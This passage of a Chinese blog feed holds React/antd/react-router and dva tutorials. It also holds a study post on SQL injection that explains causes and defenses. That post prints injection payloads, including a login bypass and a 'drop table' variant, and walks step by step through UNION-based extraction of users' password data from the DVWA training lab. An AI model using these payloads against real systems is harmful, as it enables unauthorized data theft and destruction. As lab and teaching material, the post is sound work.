#333; color: #fff; padding-left: 20px; padding-top: 3px; padding-bottom: 3px;&#125;.miniFooter h1 &#123; font-size: 5px;&#125; Ant Design样式框架样式框架们：比如之前使用较多的Bootstrap，Google的Material-UI(主要用来做一些React的样式管理，扁平式的UI样式)，蚂蚁金服的Ant Design。在该demo中引入antd:1npm install antd --save 以Input输入框组件为例，在src\components\body.js中引入并使用antd Input组件，如下:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263import React, &#123; Component &#125; from 'react';import PropTypes from 'prop-types';// import ReactDOM from 'react-dom';import BodyChild from './bodyChild';import ReactMixin from 'react-mixin';import MixinLog from './mixins';import &#123; Input &#125; from 'antd'; //引入antd Input组件class Body extends Component &#123; constructor() &#123; super(); //调用基类的所有初始化方法 this.state = &#123;userName: "Shirley"&#125;; //初始化赋值 &#125; changeUserInfo() &#123; this.setState(&#123;userName: "Your name has changed!"&#125;); // 第一种方式操作真实DOM // var submitBtn = document.getElementById("submitBtn"); // ReactDOM.findDOMNode(submitBtn).style.color = 'red'; // 第二种方式操作真实DOM console.log(this.refs.submitBtn); this.refs.submitBtn.style.color = 'red'; // 使用Mixin共享方法log() MixinLog.log(); &#125; handleChildValueChange(event) &#123; //通过事件形式，获取子组件的数据 this.setState(&#123;userName: event.target.value&#125;); &#125; render() &#123; return ( &lt;div&gt; &lt;h2&gt;这是是页面主体&lt;/h2&gt; &lt;p&gt;&#123;this.state.userName&#125;&lt;/p&gt; &#123;/* 通过 PropTypes 对象校验uesrId的类型 */&#125; &lt;p&gt;&#123;this.props.userId&#125;&lt;/p&gt; &#123;/* antd Input组件使用 */&#125; &lt;Input placeholder="Basic usage of antd" /&gt; &#123;/* 操作真实DOM */&#125; &lt;input id="submitBtn" ref="submitBtn" type="button" value="提交" onClick=&#123;() =&gt; this.changeUserInfo()&#125; /&gt; &#123;/* BodyChild 子组件 */&#125; &lt;BodyChild handleChildValueChange=&#123;this.handleChildValueChange.bind(this)&#125;/&gt; &lt;/div&gt; ); &#125;&#125;// Body组件props属性校验Body.propTypes = &#123; userId: PropTypes.number&#125;;// 组件间共享 MixinReactMixin(Body.prototype, MixinLog);export default Body; 在body.js的Body组件的父组件App.js中，引入antd的css样式如下，即可完全显示Ant Design 的Input输入框的样子：123456789101112131415161718192021import React, &#123; Component &#125; from 'react';import ComponentHeader from './header';import ComponentFooter from './footer';import Body from './body';import 'antd/dist/antd.css'; //引入antd的css样式class App extends Component &#123; render() &#123; return ( &lt;div className="App"&gt; &lt;ComponentHeader /&gt; &#123;/* Body组件通过 PropTypes对象校验uesrId的类型必须为Number类型 */&#125; &lt;Body userId=&#123;123&#125; /&gt; &lt;ComponentFooter /&gt; &lt;/div&gt; ); &#125;&#125;export default App; React Routerreact-router用来控制页面间的路由，安装react-router:1$ npm install react-router --save 注意踩坑！！！ 我安装的react-router版本@4.2.0，由于V4版本变化很大，所以遇到很多跟教程用法不一致的地方。React Router包含3个库，react-router、react-router-dom和react-router-native。react-router-dom和react-router-native都依赖于react-router(提供最基本的路由功能)，所以安装时react-router也会自动安装。建议安装react-router-dom(在浏览器中使用):1$ npm install react-router-dom --save 卸载第三方依赖包：把之前下载的react-router卸载掉，好用以上命令重新安装react-router-dom，参考博客React-Native填坑之删除第三方开源组件的依赖包：1$ npm uninstall react-router --save 然后修改src/index.js，内容如下：123456789101112131415161718192021222324import React, &#123; Component &#125; from 'react';import ReactDOM from 'react-dom';import App from './components/App';import ComponentList from './components/list';import &#123; HashRouter, Route, Switch &#125; from 'react-router-dom';class RouterApp extends Component &#123; render() &#123; return ( // 这里替换了之前的index.js，变成了程序的入口 &lt;HashRouter&gt; &#123;/* Router 中只能有唯一的一个子元素 */&#125; &lt;Switch&gt; &#123;/* App主页 */&#125; &lt;Route exact path="/" component=&#123;App&#125;&gt;&lt;/Route&gt; &#123;/* ComponentList 列表页 */&#125; &lt;Route exact path="/list" component=&#123;ComponentList&#125;&gt;&lt;/Route&gt; &lt;/Switch&gt; &lt;/HashRouter&gt; ); &#125;&#125;ReactDOM.render(&lt;RouterApp /&gt;, document.getElementById('root')); 上述代码在&lt;RouterApp /&gt;组件中进行路由的绑定，取代了之前的index.js变成了程序的入口。 1234567891011121314// src/components/list.js 中的 &lt;ComponentList /&gt; 组件如下import React, &#123; Component &#125; from 'react';class ComponentList extends Component &#123; render() &#123; return ( &lt;div&gt; &lt;h2&gt;这里是列表页&lt;/h2&gt; &lt;/div&gt; ); &#125;&#125;export default ComponentList; Router相关概念React Router通过 Router 和 Route 两个组件完成路由功能，一个应用只需要一个Router实例，所有路由配置组件 Route 都定义为 Router 的子组件。在WEB应用中，一般使用对 Router 进行包装的 &lt;BrowserRouter /&gt;或 &lt;HashRouter /&gt;两个组件。&lt;BrowserRouter /&gt;使用HTML5的 history API(pushState、replaceState等)实现应用的 UI 和 URL 同步。&lt;HashRouter /&gt;使用 URL 的 hash 实现 UI 和 URL 同步。 &lt;BrowserRouter /&gt;创建的URL形如：http://example.com/some/path&lt;HashRouter /&gt;创建的URL形如：http://example.com/#/some/path使用&lt;BrowserRouter /&gt;时，一般还需要对服务器进行配置，让服务器能正确地处理所有可能的 URL(尤其对单页面应用，要求服务器总是返回唯一的HTML页面)；而使用&lt;HashRouter /&gt;则不存在这个问题，因为hash部分地内容会被服务器自动忽略，真正有效地部分是hash之前的部分，而对单页应用这部分是固定的。 Router会创建一个history对象，history 用来跟踪 URL，当 URL 发生变化时，Router的后代组件会重新渲染。React Router中提供的其他组件可以通过 context 获取 history 对象，隐含说明了 React Router 中的其他组件必须作为 Router 组件的后代组件使用。Router 中只能有唯一的一个子元素。 &lt;Route /&gt;是React Router用于配置路由信息的组件，每当有一个组件需要根据URL决定是否渲染时，就需要创建一个&lt;Route /&gt;。上述路由管理两个页面，分别是/下的&lt;App /&gt;主页，和/list/下的&lt;ComponentList /&gt;列表页。 Router参数传递当URL和Route匹配时，Route会创建一个match对象作为props中的一个属性传递给被渲染的组件。利用match对象的params属性给Route的path传递参数。例如：&lt;Route exact path=&quot;/list/:id&quot; component={ComponentList}&gt;&lt;/Route&gt;包含一个参数id，params就是用于从匹配的URL中解析出path中的参数，例如当访问http://example.com/list/1时，params={id:1}。index.js1234567891011121314151617181920212223import React, &#123; Component &#125; from 'react';import ReactDOM from 'react-dom';import App from './components/App';import ComponentList from './components/list';import &#123; HashRouter, Route, Switch &#125; from 'react-router-dom';class RouterApp extends Component &#123; render() &#123; return ( // 这里替换了之前的index.js，变成了程序的入口 &lt;HashRouter&gt; &#123;/* Router 中只能有唯一的一个子元素 */&#125; &lt;Switch&gt; &#123;/* App主页 */&#125; &lt;Route exact path="/" component=&#123;App&#125;&gt;&lt;/Route&gt; &#123;/* ComponentList 列表页 */&#125; &lt;Route exact path="/list/:id" component=&#123;ComponentList&#125;&gt;&lt;/Route&gt; &lt;/Switch&gt; &lt;/HashRouter&gt; ); &#125;&#125;ReactDOM.render(&lt;RouterApp /&gt;, document.getElementById('root')); list.js12345678910111213import React, &#123; Component &#125; from 'react';class ComponentList extends Component &#123; render() &#123; return ( &lt;div&gt; &lt;h2&gt;这里是列表页 &#123;this.props.match.params.id&#125;&lt;/h2&gt; &lt;/div&gt; ); &#125;&#125;export default ComponentList;]]></content>
      <categories>
        <category>React</category>
      </categories>
      <tags>
        <tag>antd</tag>
        <tag>React</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Ant Design 入门学习总结]]></title>
    <url>%2F2018%2F05%2F28%2FAnt-Design-%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[Ant Design of React 提供开箱即用的高质量 React 组件，具体的UI组件参见Ant Design 文档。 Ant Design简介Ant Design of React 是 Ant Design 的 React 实现。npm安装：npm install antd --save 按需加载： 使用 babel-plugin-import，babel-plugin-import 会帮助你加载 JS 和 CSS，只需从 antd 引入模块即可，无需单独引入样式。123456// .babelrc or babel-loader option&#123; "plugins": [ ["import", &#123; "libraryName": "antd", "libraryDirectory": "es", "style": "css" &#125;] // `style: true` 会加载 less 文件 ]&#125; 使用示例：12import &#123; DatePicker &#125; from 'antd';ReactDOM.render(&lt;DatePicker /&gt;, mountNode); 快速上手：利用antd-init脚手架生成应用实例。(注意： antd-init只用于学习和体验antd如何使用，实际业务项目建议使用 dva-cli 和 create-react-app 进行搭建)$ npm install antd-init -g -&gt; $ mkdir antd-demo &amp;&amp; cd antd-demo -&gt; $ antd-initindex.js12345678910111213141516171819202122232425262728293031323334import React from 'react';import ReactDOM from 'react-dom';import &#123; LocaleProvider, DatePicker, message &#125; from 'antd';// 由于 antd 组件的默认文案是英文，所以需要修改为中文import zhCN from 'antd/lib/locale-provider/zh_CN';import moment from 'moment';import 'moment/locale/zh-cn';moment.locale('zh-cn');class App extends React.Component &#123; constructor(props) &#123; super(props); this.state = &#123; date: '', &#125;; &#125; handleChange(date) &#123; message.info('您选择的日期是: ' + (date ? date.toString() : '')); this.setState(&#123; date &#125;); &#125; render() &#123; return ( &lt;LocaleProvider locale=&#123;zhCN&#125;&gt; &lt;div style=&#123;&#123; width: 400, margin: '100px auto' &#125;&#125;&gt; &lt;DatePicker onChange=&#123;value =&gt; this.handleChange(value)&#125; /&gt; &lt;div style=&#123;&#123; marginTop: 20 &#125;&#125;&gt;当前日期：&#123;this.state.date &amp;&amp; this.state.date.toString()&#125;&lt;/div&gt; &lt;/div&gt; &lt;/LocaleProvider&gt; ); &#125;&#125;ReactDOM.render(&lt;App /&gt;, document.getElementById('root')); $ npm start, 访问http://127.0.0.1:8000UI样式如下： $ npm run build，入口文件会构建到 dist 目录中，可以自由部署到不同环境中进行引用。 项目实战 dvadva 是一个基于 React 和 Redux (Redux 或者 MobX 为数据应用框架) 的轻量应用框架，概念来自 elm，支持 side effects、热替换、动态加载、react-native、SSR 等，已在生产环境广泛应用。Ant Design React 作为一个 UI 库，搭配 React 生态圈内的Redux，构建了轻量应用框架dva。(1)安装dva-cli123$ npm install dva-cli -g$ dva -vdva-cli version 0.9.1 (2)创建新应用1$ dva new dva-quickstart 以上命令用于创建 dva-quickstart 目录，包含项目初始化目录和文件，并提供开发服务器、构建脚本、数据 mock 服务、代理服务器等功能。接下来启动开发服务器：12$ cd dva-quickstart$ npm start 在浏览器访问http://localhost:8000 ，会看到 dva 的欢迎界面。(3)使用antd通过 npm 安装 antd 和 babel-plugin-import(用来按需加载 antd 的脚本和样式，而不是把整个库都引入，从而提高性能) 。1$ cnpm install antd babel-plugin-import --save 注意： 一定要用cnpm，npm真的慢出天际。。。。接下来编辑 .webpackrc，使 babel-plugin-import 插件生效:12345&#123;+ "extraBabelPlugins": [+ ["import", &#123; "libraryName": "antd", "libraryDirectory": "es", "style": "css" &#125;]+ ]&#125; (4)定义路由写个应用来显示产品列表。首先第一步是创建路由，路由可以想象成是组成应用的不同页面,src/routes下是存放页面的。新建 route component src/routes/Products.js，内容如下:1234567import React from 'react';const Products = (props) =&gt; ( &lt;h2&gt;List of Products&lt;/h2&gt;);export default Products; 添加路由信息到路由表，编辑 router.js(处理页面路由):123+ import Products from './routes/Products';...+ &lt;Route path="/products" exact component=&#123;Products&#125; /&gt; 在浏览器里打开 http://localhost:8000/#/products ，能看到前面定义的 &lt;h2&gt; 标签。(5)编写 UI Component编写一个 ProductList component。新建 components/ProductList.js 文件:1234567891011121314151617181920212223242526272829303132import React from 'react';import PropTypes from 'prop-types';import &#123; Table, Popconfirm, Button &#125; from 'antd';const ProductList = (&#123; onDelete, products &#125;) =&gt; &#123; const columns = [&#123; title: 'Name', dataIndex: 'name', &#125;, &#123; title: 'Actions', render: (text, record) =&gt; &#123; return ( &lt;Popconfirm title="Delete?" onConfirm=&#123;() =&gt; onDelete(record.id)&#125;&gt; &lt;Button&gt;Delete&lt;/Button&gt; &lt;/Popconfirm&gt; ); &#125;, &#125;]; return ( &lt;Table dataSource=&#123;products&#125; columns=&#123;columns&#125; /&gt; );&#125;;ProductList.propTypes = &#123; onDelete: PropTypes.func.isRequired, products: PropTypes.array.isRequired,&#125;;export default ProductList; 其中&lt;Table /&gt;的columns用于表格列的配置描述，类型ColumnProps[]。见文档(6)定义 Model完成 UI 后，现在开始处理数据和逻辑。dva 通过 model 的概念把一个领域的模型管理起来，包含同步更新 state 的 reducers，处理异步逻辑的 effects，订阅数据源的 subscriptions 。新建 model models/products.js:123456789export default &#123; namespace: 'products', state: [], reducers: &#123; 'delete'(state, &#123; payload: id &#125;) &#123; return state.filter(item =&gt; item.id !== id); &#125;, &#125;,&#125;; 上述 model 里： namespace 表示在全局 state 上的 key state 是初始值，在这里是空数组 reducers 等同于 redux 里的 reducer，接收 action，同步更新 state 然后在index.js中载入：12// 3. Model+ app.model(require('./models/products').default); (7)connect 起来将 model 和 component 串联起来。dva 提供了 connect 方法，类似于 react-redux 的 connect，用于将 model 和 component 串联起来。编辑 src/routes/Products.js(页面展示组件)，替换为以下内容:1234567891011121314151617181920212223import React from 'react';import &#123; connect &#125; from 'dva';import ProductList from '../components/ProductList';const Products = (&#123; dispatch, products &#125;) =&gt; &#123; function handleDelete(id) &#123; dispatch(&#123; type: 'products/delete', payload: id, &#125;); &#125; return ( &lt;div&gt; &lt;h2&gt;List of Products&lt;/h2&gt; &lt;ProductList onDelete=&#123;handleDelete&#125; products=&#123;products&#125; /&gt; &lt;/div&gt; );&#125;;// export default Products;export default connect((&#123; products &#125;) =&gt; (&#123; products,&#125;))(Products); 最后mock一些初始数据让此应用运行起来，编辑index.js:123456789- const app = dva();+ const app = dva(&#123;+ initialState: &#123;+ products: [+ &#123; name: 'dva', id: 1 &#125;,+ &#123; name: 'antd', id: 2 &#125;,+ ],+ &#125;,+ &#125;); (8)构建应用完成开发并且在开发环境验证之后，接下来部署到生产环境：1$ npm run build 几秒后控制台输出如下：1234567891011$ npm run build&gt; @ build C:\Users\Shirley\Desktop\dva-quickstart&gt; roadhog buildCompiled successfully.File sizes after gzip: 145.28 KB dist\index.js 17.84 KB dist\index.css build 命令会打包所有的资源，包含 JavaScript, CSS, web fonts, images, html 等，可以在 dist/ 目录下找到这些文件。 在 create-react-app 中使用 antd（1）安装和初始化在命令行中安装 create-react-app 工具:1$ npm install -g create-react-app 新建一个项目:1$ create-react-app antd-demo 工具会自动初始化一个脚手架并安装 React 项目的各种必要依赖。接下来进入项目并启动，浏览器会访问 http://localhost:3000/：12$ cd antd-demo$ npm start (2)引入 antdnpm 安装并引入 antd:1$ npm add antd 修改 src/App.js，引入 antd 的按钮组件:123456789101112131415import React, &#123; Component &#125; from 'react';import Button from 'antd/lib/button';import './App.css';class App extends Component &#123; render() &#123; return ( &lt;div className="App"&gt; &lt;Button type="primary"&gt;Button&lt;/Button&gt; &lt;/div&gt; ); &#125;&#125;export default App; 修改 src/App.css，在文件顶部引入 antd/dist/antd.css:12345@import '~antd/dist/antd.css';.App &#123; text-align: center;&#125; 现在可以看到页面上已经有了 antd 的蓝色按钮组件。(3)高级配置步骤(2)已经把组件成功运行起来了，但是在实际开发过程中还有很多问题，例如上面的例子实际上加载了全部的 antd 组件的样式（对前端性能是个隐患）。需要对 create-react-app 的默认配置进行自定义，这里使用 react-app-rewired （一个对 create-react-app 进行自定义配置的社区解决方案）。 引入 react-app-rewired 并修改 package.json 里的启动配置:1$ npm add react-app-rewired --dev 123456789/* package.json */"scripts": &#123;- "start": "react-scripts start",+ "start": "react-app-rewired start",- "build": "react-scripts build",+ "build": "react-app-rewired build",- "test": "react-scripts test --env=jsdom",+ "test": "react-app-rewired test --env=jsdom",&#125; 然后在项目根目录创建一个 config-overrides.js 用于修改默认配置:1234module.exports = function override(config, env) &#123; // do stuff with the webpack config... return config;&#125;; 使用 babel-plugin-import(用于 按需加载 组件代码和样式的 babel 插件)，安装它并修改 config-overrides.js 文件:1$ npm add babel-plugin-import --dev 123456+ const &#123; injectBabelPlugin &#125; = require('react-app-rewired'); module.exports = function override(config, env) &#123;+ config = injectBabelPlugin(['import', &#123; libraryName: 'antd', libraryDirectory: 'es', style: 'css' &#125;], config); return config; &#125;; 然后移除前面在 src/App.css 里全量添加的 @import &#39;~antd/dist/antd.css&#39;; 样式代码，并且按下面的格式引入模块:1234567891011121314151617 // src/App.js import React, &#123; Component &#125; from 'react';- import Button from 'antd/lib/button';+ import &#123; Button &#125; from 'antd'; import './App.css'; class App extends Component &#123; render() &#123; return ( &lt;div className="App"&gt; &lt;Button type="primary"&gt;Button&lt;/Button&gt; &lt;/div&gt; ); &#125; &#125; export default App; 需要重启npm start访问页面，否则看不到效果。antd 组件的 js 和 css 代码都会按需加载。 自定义主题：自定义主题需要用到 less 变量覆盖功能，可以引入 react-app-rewire 的 less 插件 react-app-rewire-less 来帮助加载 less 样式，同时修改 config-overrides.js 文件:1$ npm add react-app-rewire-less --dev 1234567891011 const &#123; injectBabelPlugin &#125; = require('react-app-rewired');+ const rewireLess = require('react-app-rewire-less'); module.exports = function override(config, env) &#123;- config = injectBabelPlugin(['import', &#123; libraryName: 'antd', style: 'css' &#125;], config);+ config = injectBabelPlugin(['import', &#123; libraryName: 'antd', style: true &#125;], config);+ config = rewireLess.withLoaderOptions(&#123;+ modifyVars: &#123; "@primary-color": "#1DA57A" &#125;,+ &#125;)(config, env); return config; &#125;; 这里利用了 less-loader 的 modifyVars 来进行主题配置，修改配置后需要重启 npm start才能看到效果。]]></content>
      <categories>
        <category>antd</category>
      </categories>
      <tags>
        <tag>antd</tag>
        <tag>dva</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[（三）Web安全深度剖析学习【SQL注入】]]></title>
    <url>%2F2018%2F05%2F22%2FWeb%E5%AE%89%E5%85%A8%E6%B7%B1%E5%BA%A6%E5%89%96%E6%9E%90%E5%AD%A6%E4%B9%A0-SQL%E6%B3%A8%E5%85%A5%2F</url>
    <content type="text"><![CDATA[《Web安全深度剖析》学习总结, 本部分主要总结SQL注入原理。SQL注入漏洞是Web层面最高危的漏洞之一。 SQL注入原理SQL注入指web应用程序对用户输入数据的合法性没有判断，攻击者可以在web应用程序事先定义好的查询语句的结尾上添加额外的SQL语句，以此来实现欺骗数据库服务器执行非授权的任意SQL查询，从而进一步得到相应的数据信息。 即SQL注入通过把额外的SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串后，最终达到欺骗服务器执行恶意的SQL命令。 万能密码案例（JSP + SQL Server）假设数据库中只有admin用户，密码为password。 一般登录某个网站需要输入用户名和密码，现在构造一个特殊用户名 &#39;or 1=1--，其中--是SQL Server的单行注释符号。现在使用该特殊用户名登录，密码可随意填写或不填，都可正常登录。 下面分析处理用户登录的程序：1234567891011121314151617public boolean findAdmin(Admin admin) &#123; String sql = "select count(*) from admin where username='"+admin.getUsername()+"' and password='"+admin.getPassword()+"'"; //SQL查询语句 try &#123; ResultSet res = this.conn.createStatement().executeQuery(sql); //执行SQL语句 if(res.next()) &#123; int i = res.getInt(1); //获取第一列的值 if(i&gt;0) &#123; return true; //如果结果大于0，返回true &#125; &#125; &#125; catch(Exception e) &#123; e.printStackTrace(); //打印异常信息 &#125; return false;&#125; 上述SQL语句的本意是，在数据库中查询username=xxx&amp;&amp;password=xxx的结果，若查询结果大于0，则表示用户存在，返回true，表示登录成功，否则返回false，登录失败。 现在假设用户名为admin,密码为password，执行SQL语句如下：1select count(*) from admin where username='admin' and password='password' 此时数据库中存在admin用户，并且密码为password，查询结果大于0，返回true，用户登录成功。 接下来使用构造的特殊用户登录，执行SQL语句如下：1select count(*) from admin where username=''or 1=1--' and password='' 此时password字段被注释掉了，所以输不输入密码都无所谓，并且username=&#39;&#39;or 1=1语句永远为真，所以最终执行的SQL语句相当于：1select count(*) from admin //查询admin表所有数据条数 显然以上查询语句返回条数大于0，返回true，可以成功登录。至此一次简单的SQL注入过程完成。 SQL注入危害很大，假设构造用户名如下： &#39;or 1=1;drop table admin--，由于SQL Server支持多语句执行，这里可以直接删除admin表。危害很大滴！ SQL注入漏洞的成因：用户输入的数据被SQL解释器执行。 注入漏洞分类常见的SQL注入类型包括：数字型和字符型。不管分类如何，攻击者的目的都是绕过程序限制，使用户输入的数据带入数据库执行，利用数据库的特殊性获取更多的信息或者更大的权限。 数字型注入当输入的参数为整型时，如ID、年龄、页码等，若存在注入漏洞，则可以认为是数字型注入。数字型注入是最简单的一种。假设URL为http://www.xxser.com/test.php?id=8，可以猜测SQL语句为：1select * from table where id=8 测试步骤如下：(1) http://www.xxser.com/test.php?id=8SQL语句为select * from table where id=8，该语句会出错，导致脚本程序无法正常从数据库中获取数据，从而使原来的页面出现异常。(2)http://www.xxser.com/test.php?id=8 and 1=1SQL语句为select * from table where id=8 and 1=1，此时语句执行正常，返回数据与原始请求无异。(3)http://www.xxser.com/test.php?id=8 and 1=2SQL语句为select * from table where id=8 and 1=2，语句执行正常，但无法查询出数据，因为and 1=2始终为假，返回数据与原始请求有差异。 若以上三个步骤都满足，则程序可能存在SQL注入漏洞。 数字型注入多出现在ASP、PHP等弱类型语言中，弱类型语言会自动推导变量类型，如参数id=8，PHP会自动推导变量id的数据类型为int类型，id=8 and 1=1会推到为string 类型。而JAVA、C++等强类型语言，若试图把一个string类型转换为int类型会抛出异常。所以强类型语言很少存在数字型注入漏洞。 字符型注入当输入参数为字符串时，称为字符型注入。数字类型不需要单引号闭合，而字符串类型一般需要使用单引号来闭合。字符型注入关键：如何闭合SQL语句以及注释多余的代码。只要是字符串类型注入，都必须闭合单引号以及注释多余的代码。例如，update语句：1update Person set username='username',set password='password' where id=1 现在对上述SQL语句进行注入，需要闭合单引号，可以在username或password处插入语句&#39;+(select@@version)+&#39;，最终执行的SQL语句为：1update Person set username='username',set password=''+(select@@version)+'' where id=1 补充： 不同的数据库，字符串连接符不同，SQL Server字符串连接符号为+，Oracle字符串连接符号为||，MySQL字符串连接符号为+。 SQL注入分类Cookie注入、POST注入、盲注、延时注入都是数字型注入和字符型注入在不同位置的展现形式，都可归纳为数字型注入和字符型注入。 POST注入(注入字段在POST数据中) Cookie注入(注入字段在Cookie数据中) 延时注入(使用数据库延时特性注入) 搜索注入(注入处为搜索的地点) base64注入(注入字符串需要经过base64加密) 防止SQL注入关键在于后端程序对用户输入进行过滤。防御主要分为两种：数据类型判断和特殊字符转义。 严格的数据类型数据类型处理正确后，足以抵挡数字型注入。对于强类型语言，几乎不存在数字类型的注入。对于弱类型语言，需要在程序中严格判断数据类型。如使用is_numeric()、ctype_digit()等函数判断数据类型。 特殊字符转义此方法针对字符型注入。由于攻击者在字符型注入中会使用单引号等特殊字符，可以将这些特殊字符转义，即可防御字符型SQL注入。 使用预编译语句Java提供了三个接口与数据库交互，Statement、PrepareStatement、CallableStatement。Statement用于执行静态SQL语句，并返回它所生成结果的对象。PrepareStatement为Statement的字类，表示预编译SQL语句的对象。CallableStatement为PrepareStatement的子类，用于执行SQL存储过程。 框架技术在众多的框架中，有一类框架专门与数据库打交道，称为持久层框架，比较有代表性的有Hibernate、MyBatis、JORM等。 DVWA之SQL注入参考博客新手指南：DVWA-1.9全级别教程之SQL Injection SQL注入，是指攻击者通过注入恶意的SQL命令，破坏SQL查询语句的结构，从而达到执行恶意SQL语句的目的。SQL注入漏洞的危害是巨大的，常常会导致整个数据库被“脱裤”，尽管如此，SQL注入仍是现在最常见的Web漏洞之一。 (1)基于报错的检测方法：各种符号以及组合： &#39; &quot; ( % (2)基于布尔的检测：1&#39; and &#39;1&#39;=&#39;1 和 1&#39; and &#39;1&#39;=&#39;2 , 相当于1&#39; and &#39;1 和 1&#39; and &#39;0当返回的结果不同时即有漏洞。 (3)几个常用的函数： user()返回当前数据库连接使用的用户；database()返回当前数据库连接使用的数据库；version()返回当前数据库的版本；concat或者concat-ws函数可以将这些函数进行组合使用并显示出来。concat函数中，将其中的参数直接连接起来产生新的字符串。而concat_ws函数，第一个参数作为分隔符将后面各个参数的内容分隔开来再进行相应的连接产生新的字符串。以其常用的例子为例：1concat_ws(char(32,58,32),user(),database(),version()) 其中char()函数为将里面的参数转化为相应的字符，32为空格，58为冒号:，通过这样的方式可以绕过一些简单的过滤机制。 (4)几个全局函数：@@datadir :查询数据库的文件位置@@hostname:查询主机名@@version_compile_os:查询操作系统版本 手工注入思路自动化的注入神器sqlmap。手工注入（非盲注）的步骤如下： 1.判断是否存在注入，注入是字符型还是数字型 2.猜解SQL查询语句中的字段数 3.确定显示的字段顺序 4.获取当前数据库 5.获取数据库中的表 6.获取表中的字段名 7.下载数据 LOWSOURCE123456789101112131415161718192021222324252627&lt;?phpif( isset( $_REQUEST[ 'Submit' ] ) ) &#123; // Get input $id = $_REQUEST[ 'id' ]; // Check database $query = "SELECT first_name, last_name FROM users WHERE user_id = '$id';"; $result = mysql_query( $query ) or die( '&lt;pre&gt;' . mysql_error() . '&lt;/pre&gt;' ); // Get results $num = mysql_numrows( $result ); $i = 0; while( $i &lt; $num ) &#123; // Get values $first = mysql_result( $result, $i, "first_name" ); $last = mysql_result( $result, $i, "last_name" ); // Feedback for end user echo "&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;"; // Increase loop count $i++; &#125; mysql_close();&#125;?&gt; Low级别的代码对来自客户端的参数id没有进行任何的检查与过滤，存在明显的SQL注入。现实攻击场景下，攻击者是无法看到后端代码的，所以下面的手工注入步骤是建立在无法看到源码的基础上。1.判断是否存在注入，注入是字符型还是数字型(1)输入1，查询成功： (2)输入1&#39; and &#39;1&#39;=&#39;2，查询失败，返回结果为空： (3)输入1&#39; and &#39;1&#39;=&#39;1，查询成功： (4)输入1&#39; or &#39;1&#39;=&#39;1，查询成功:返回了多个结果，说明存在字符型注入。 2.猜解SQL查询语句中的字段数(1)输入1&#39; or 1=1 order by 1 #，查询成功(#或--表示注释)： SQL ORDER BY 子句: 用于对结果集进行排序。根据指定的列对结果集进行排序，默认按照升序对记录进行排序。若希望按照降序对记录进行排序，可以使用 DESC 关键字。ORDER BY 1 表示所select的字段按第一个字段排序。 补充 SQL语句中$与#区别：select * from user where id=${id} and username=#{username}在经过编译后，得到如下语句:select * from user where id=2 and username=?经过编译后,如果是#{}的形式是编译成?，而如果${}是编译成直接的数据。区别：#{}: 是以预编译的形式，将参数设置到SQL语句中;PreparedStatement:防止SQL注入${}: 取出的值直接拼装在SQL语句中;会有安全问题。$方式一般用于传入数据库对象，例如传入表名。 (2)输入1&#39; or 1=1 order by 2 #，查询成功: (3)输入1′ or 1=1 order by 3 #，查询失败:1Unknown column &apos;3&apos; in &apos;order clause&apos; 说明执行的SQL查询语句中只有两个字段，即这里的First name、Surname。 3.确定显示的字段顺序输入1&#39; union select 1,2 #，查询成功：说明执行的SQL语句为select First name,Surname from 表 where ID=&#39;id&#39;。select 1,2中的1和2只是为了凑够union关键字前面的那个表的字段数，在sql注入时，在相应位置替换成想要的数据即可。 补充UNION操作符:UNION 操作符用于合并两个或多个 SELECT 语句的结果集。注意，UNION 内部的 SELECT 语句必须拥有相同数量的列。列也必须拥有相似的数据类型。同时，每条 SELECT 语句中的列的顺序必须相同。默认地，UNION 操作符选取不同的值。如果允许重复的值，请使用 UNION ALL。SQL UNION 语法如下:123SELECT column_name(s) FROM table_name1UNIONSELECT column_name(s) FROM table_name2 4.获取当前数据库输入1′ union select 1,database() #，查询成功：说明当前的数据库为dvwa。 5.获取数据库中的表输入1&#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #，查询成功:说明数据库dvwa中一共有两个表，guestbook与users。 补充：MySQL中的information_schema 数据库保存了MySQL服务器所有数据库的信息，如数据库名，数据库的表，表栏的数据类型与访问权限等，提供了访问数据库元数据的方式。例如：123SCHEMATA表：提供了关于数据库名的信息。TABLES表：给出了关于数据库中的表的信息。COLUMNS表：给出了表中的列信息。 参考博客mysql中information_schema.tables字段说明 。information_schema.tables表用来保存数据库中所有表的信息。table_schema=数据库名表示数据表所属的数据库。table_name表名称。group_concat()会计算哪些行属于同一组，将属于同一组的列显示出来(同一组的显示在一行)，要返回哪些列，由函数参数(就是字段名)决定。分组必须有个标准，就是根据group by指定的列进行分组。 6.获取表中的字段名输入1&#39; union select 1,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; #，查询成功：说明users表中有8个字段，分别是user_id,first_name,last_name,user,password,avatar,last_login,failed_login。 7.下载数据输入1&#39; or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #，查询成功：这样就得到了users表中所有用户的user_id,first_name,last_name,password的数据。]]></content>
      <categories>
        <category>Web Security</category>
      </categories>
      <tags>
        <tag>Web Security</tag>
        <tag>SQL注入</tag>
        <tag>SQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP入门学习]]></title>
    <url>%2F2018%2F05%2F20%2FPHP%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E8%8F%9C%E9%B8%9F%2F</url>
